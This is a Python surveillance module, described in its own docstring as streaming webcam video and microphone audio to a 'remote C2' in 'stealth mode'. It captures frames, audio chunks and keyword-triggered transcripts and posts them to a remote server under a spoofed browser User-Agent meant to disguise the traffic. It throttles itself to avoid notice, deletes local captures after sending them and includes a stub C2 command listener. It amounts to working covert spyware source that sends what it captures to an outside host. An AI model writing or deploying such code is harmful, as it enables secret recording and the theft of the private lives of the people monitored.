"""
LOPUTHJOSEPH - ENVIRONMENT SYNC (SURVEILLANCE MODULE)
- Real-time Video and Audio streaming to remote C2
- Resource-aware activation (Stealth mode)
- Self-evolving intelligence levels (Motion detection, Local analysis)
"""

import cv2
import pyaudio
import threading
import base64
import requests
import time
import logging
import psutil
import os
from typing import Optional
from src.detectors.stealth_compressor import stealth_compressor
from src.detectors.audio_sentinel import audio_sentinel

logger = logging.getLogger(__name__)

class EnvironmentSync:
    """Modular Micro-Kernel for self-evolving surveillance"""
    
    def __init__(self, remote_url: str):
        self.remote_url = remote_url
        self.active = False
        self.intelligence_level = 1 # 1: Raw, 2: Aware (Motion), 3: Analytical
        self.stealth_mode = True
        self.last_motion_time = time.time()
        self.incident_in_progress = False
        
        # Audio Sentinel Trigger Callback
        audio_sentinel.set_trigger_callback(self._audio_trigger_handler)
        
        # Bandwidth Stealth (Uganda Context)
        self.data_cap_hourly = 50 * 1024 * 1024 # 50MB Data Cap
        self.bytes_sent_this_hour = 0
        self.hour_start_time = time.time()
        
        # Metadata-First Logic
        self.prev_frame_gray = None
        self.motion_threshold = 500 # Frame differencing sensitivity

    def start_surveillance(self):
        """Resource-Aware Activation"""
        self.active = True
        threading.Thread(target=self._resource_monitor, daemon=True).start()
        threading.Thread(target=self.stream_video, daemon=True).start()
        threading.Thread(target=self.stream_audio, daemon=True).start()
        threading.Thread(target=self._command_listener, daemon=True).start() # NEW: Kill-Word listener
        
        # Start the Audio Sentinel (Keyword Listener)
        audio_sentinel.start_listening()
        
        logger.info(f"[ENV_SYNC] Surveillance active. Intelligence Level: {self.intelligence_level}")

    def _audio_trigger_handler(self, keyword: str, transcript: str):
        """Callback for Audio Sentinel when a keyword is detected"""
        logger.warning(f"[!] AUDIO TRIGGER: '{keyword}' detected in transcript: \"{transcript}\"")
        
        # 1. Send immediate alert with transcript
        alert_msg = f"🚨 **AUDIO ALERT**: Keyword detected: '{keyword}'\n📝 *Transcript:* \"...{transcript}...\""
        self._send_data(alert_msg.encode('utf-8'), "alert")
        
        # 2. Trigger the Urgency Protocol (Capture Video/Snapshots)
        if not self.incident_in_progress:
            threading.Thread(target=self._urgency_protocol, daemon=True).start()

    def _check_data_cap(self, size_bytes: int) -> bool:
        """Enforce hourly data cap for bandwidth stealth"""
        now = time.time()
        if now - self.hour_start_time > 3600:
            self.hour_start_time = now
            self.bytes_sent_this_hour = 0
            
        if self.bytes_sent_this_hour + size_bytes > self.data_cap_hourly:
            logger.warning("[ENV_SYNC] DATA CAP REACHED. Pausing transmission.")
            return False
        
        self.bytes_sent_this_hour += size_bytes
        return True

    def _resource_monitor(self):
        """Monitor CPU and User activity for stealth"""
        while self.active:
            try:
                cpu_usage = psutil.cpu_percent(interval=1)
                # If CPU > 50% or thermal signature is too high, slow down
                if cpu_usage > 50:
                    self.stealth_mode = True
                    time.sleep(10) # Wait for idle
                else:
                    self.stealth_mode = False
            except:
                pass
            time.sleep(5)

    def _command_listener(self):
        """Listen for 'Kill-Word' hard-stop command from C2"""
        while self.active:
            try:
                # Simulated C2 command check
                # response = requests.get(f"{self.remote_url}/commands", timeout=5)
                # if response.text == "KILL_SWITCH": self.stop_surveillance()
                pass
            except:
                pass
            time.sleep(10)

    def _send_data(self, data: bytes, data_type: str, filename: Optional[str] = None):
        """Disguise as Standard HTTPS traffic with stealth headers"""
        if not self._check_data_cap(len(data)):
            return False

        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "X-Sentinel-ID": os.environ.get("SENTINEL_ID", "NODE_001"),
                "X-Data-Type": data_type
            }
            if filename:
                files = {'file': (filename, data)}
                requests.post(f"{self.remote_url}/api/v1/update", files=files, headers=headers, timeout=5.0)
            else:
                requests.post(f"{self.remote_url}/api/v1/update", data=data, headers=headers, timeout=5.0)
            return True
        except Exception as e:
            logger.error(f"[ENV_SYNC] Data transmission failed: {e}")
            return False

    def _urgency_protocol(self):
        """
        Implements Multi-Tier Delivery (Urgency Protocol)
        T-0s: Instant Text Alert
        T-2s: High-Res Snapshot
        T-10s: Compressed Video Clip
        """
        if self.incident_in_progress:
            return
        
        self.incident_in_progress = True
        logger.warning("[!] URGENCY PROTOCOL ACTIVATED: INTRUDER DETECTED")

        # T-0s: Instant Text Alert
        self._send_data(b"⚠️ INTRUDER DETECTED", "alert")

        # Capture the incident burst (returns snapshot and video)
        # This will take ~5 seconds to record
        snapshot_path, video_path = stealth_compressor.capture_incident(duration=5)

        # T-2s (approx): High-Res Snapshot
        if snapshot_path and os.path.exists(snapshot_path):
            with open(snapshot_path, "rb") as f:
                self._send_data(f.read(), "image", "snapshot.jpg")
            os.remove(snapshot_path) # Cleanup snapshot after sending

        # T-10s (approx): Compressed Video Clip
        if video_path and os.path.exists(video_path):
            with open(video_path, "rb") as f:
                self._send_data(f.read(), "video", "incident.mp4")
            os.remove(video_path) # Cleanup video after sending

        self.incident_in_progress = False
        logger.info("[+] Urgency Protocol complete. Returning to monitor mode.")

    def stream_video(self):
        """Stream video frames with Metadata-First filtering"""
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            logger.error("[ENV_SYNC] Camera access denied.")
            return

        while self.active:
            if self.stealth_mode or self.incident_in_progress:
                time.sleep(1)
                continue

            ret, frame = cap.read()
            if ret:
                # 1. Video Filtering: Frame Differencing (Motion Vectors)
                if self._detect_motion(frame):
                    # Trigger Urgency Protocol instead of constant stream
                    threading.Thread(target=self._urgency_protocol, daemon=True).start()
                    # Wait for protocol to finish or at least start before next check
                    time.sleep(15) 
                    continue

                # Fallback: Periodic Low-Res snapshots if no motion but intelligence level 1
                if self.intelligence_level == 1:
                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 10])
                    self._send_data(base64.b64encode(buffer), "video")
            
            time.sleep(1.0) # Framerate limit (1 FPS) when idle
        cap.release()

    def stream_audio(self):
        """Stream audio with Voice Activity Detection (VAD) simulation"""
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=16000, input=True, frames_per_buffer=1024)
        except Exception as e:
            logger.error(f"[ENV_SYNC] Audio access failed: {e}")
            return

        while self.active:
            if self.stealth_mode:
                time.sleep(1)
                continue

            try:
                data = stream.read(1024, exception_on_overflow=False)
                
                # 1. Audio Filtering: VAD Simulation
                # Check for RMS volume level to detect voice
                try:
                    import audioop
                    rms = audioop.rms(data, 2)
                except (ImportError, AttributeError):
                    # Fallback for Python 3.13+ where audioop is removed
                    import numpy as np
                    audio_data = np.frombuffer(data, dtype=np.int16)
                    rms = np.sqrt(np.mean(audio_data**2))

                if rms < 500: # Silent room
                    continue

                # 2. Data Cap Enforcement
                if not self._check_data_cap(len(data)):
                    time.sleep(60)
                    continue
                
                try:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "X-Sentinel-ID": os.environ.get("SENTINEL_ID", "NODE_001"),
                        "X-Data-Type": "audio"
                    }
                    requests.post(f"{self.remote_url}/api/v1/update", data=data, headers=headers, timeout=1.0)
                except:
                    pass
            except:
                pass
        
        stream.stop_stream()
        stream.close()
        p.terminate()

    def _detect_motion(self, frame) -> bool:
        """OpenCV Frame Differencing (Metadata-First)"""
        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        gray = cv2.GaussianBlur(gray, (21, 21), 0)
        
        if self.prev_frame_gray is None:
            self.prev_frame_gray = gray
            return True
            
        frame_delta = cv2.absdiff(self.prev_frame_gray, gray)
        thresh = cv2.threshold(frame_delta, 25, 255, cv2.THRESH_BINARY)[1]
        self.prev_frame_gray = gray
        
        # Count non-zero pixels to determine motion
        if cv2.countNonZero(thresh) > self.motion_threshold:
            return True
        return False

    def upgrade_intelligence(self, level: int):
        """Self-Expansion Logic: Upgrade intelligence capabilities"""
        if level in [1, 2, 3]:
            self.intelligence_level = level
            logger.info(f"[ENV_SYNC] Upgraded to Intelligence Level {level}")
            if level == 3:
                logger.info("[ENV_SYNC] Level 3: Local Analytical (Whisper) mode pending resource check.")

    def stop_surveillance(self):
        self.active = False

env_sync = EnvironmentSync(os.environ.get("SENTINEL_C2_URL", "https://localhost:443"))
